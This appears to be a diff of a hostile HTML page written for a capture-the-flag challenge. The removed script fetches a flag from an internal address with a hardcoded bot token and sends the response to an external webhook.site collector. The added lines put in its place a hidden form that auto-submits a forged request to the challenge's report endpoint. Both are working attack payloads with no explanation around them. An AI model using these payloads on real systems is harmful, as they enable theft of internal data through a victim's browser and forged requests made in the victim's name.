@@ -1,30 +1,11 @@
 <!doctype html>
 <html>
 <body>
+<form id="f" action="http://tasks.sslctf.ru:30022/report" method="POST">
+  <input type="hidden" name="url" value="https://webhook.site/d0e67d04-c4e8-4082-8bc6-de3ae5db48fa?from=csrf_test">
+</form>
 <script>
-(async () => {
-  try {
-    const r = await fetch("http://127.0.0.1.xip.io:30022/flag", {
-      headers: {
-        "X-bot-token": "s3cr3t_b0t_t0k3n_2026"
-      }
-    });
-    const t = await r.text();
-
-    await fetch("https://webhook.site/d0e67d04-c4e8-4082-8bc6-de3ae5db48fa", {
-      method: "POST",
-      mode: "no-cors",
-      body: JSON.stringify({
-        status: r.status,
-        body: t
-      })
-    });
-  } catch (e) {
-    new Image().src =
-      "https://webhook.site/d0e67d04-c4e8-4082-8bc6-de3ae5db48fa?err=" +
-      encodeURIComponent(String(e));
-  }
-})();
+document.getElementById('f').submit();
 </script>
 ok
 </body>
